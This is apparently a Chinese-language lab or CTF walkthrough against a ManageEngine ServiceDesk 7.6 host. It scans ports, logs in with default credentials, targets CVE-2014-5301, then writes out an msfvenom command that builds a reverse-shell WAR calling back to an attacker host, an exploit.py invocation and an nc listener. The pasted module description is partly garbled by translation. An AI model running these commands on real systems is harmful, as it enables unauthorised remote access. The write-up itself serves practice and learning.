- nmap 

![image](https://hackmd.io/_uploads/B1Oq0tUU6.png)

- 開啟135,139,445,8080

![image](https://hackmd.io/_uploads/rJpTRY88T.png)

- 檢查web有哪些項目

![image](https://hackmd.io/_uploads/S1QWycLLa.png)

- 發現登入點與版本號，試著用google找相關漏洞與預設憑證

![image](https://hackmd.io/_uploads/S1GEb9L8p.png)

- 發現預設憑證後嘗試登入，發現剛好可以登入

![image](https://hackmd.io/_uploads/SkHI-c88p.png)

- 順便在查了一下，發現有許多CVE漏洞，但加上版本號7.6鎖定的CVE應該是CVE-2014-5301

![image](https://hackmd.io/_uploads/r1Qt45II6.png)

![image](https://hackmd.io/_uploads/S1X9EcUUa.png)

- 根據漏洞說明如下:
    -
`此模块利用 ManageEngine ServiceDesk、
 AssetExplorer、SupportCenter 和 IT360 上传附件文件时利用了目录遍历漏洞。接受 .../"序列，该序列可被滥用以在文件系统中写入内容。写入文件系统。利用此漏洞需要进行身份验证，但此模块 将尝试使用管理员和访客的默认凭据登录。账户的默认凭据登录。另外，您也可以提供一个预先验证的 cookie 或用户名/密码 组合。对于 IT360 目标，请输入 ServiceDesk 实例的 RPORT（通常为 8400）。所有 版本之前的 ServiceDesk（包括 MSP，但不包括 v4）、AssetExplorer、SupportCenter 和 IT360（包括 MSP，但不包括 v4）、 SupportCenter 和 IT360（包括 MSP）都存在漏洞。在发布此 模块时，只有 ServiceDesk v9 版本在构建 9031 及以上版本中得到修复。该模块已 已在 Windows 和 Linux 的多个版本上成功进行了测试
 `
 
- 透過whaweb我們可以確認web version

![image](https://hackmd.io/_uploads/HyFHUqUI6.png)

- 使用msfvenom製造reverserse_shell
    - `msfvenom -p java/shell_reverse_tcp LHOST=kali_IP LPORT=kali_port -f war > shell.war`

- 開始利用漏洞
    - ` sudo python3 exploit.py 192.168.214.43 8080 administrator administrator shell.war`
    - `sudo nc -lvnp 4444`

- 拿到shell後找flag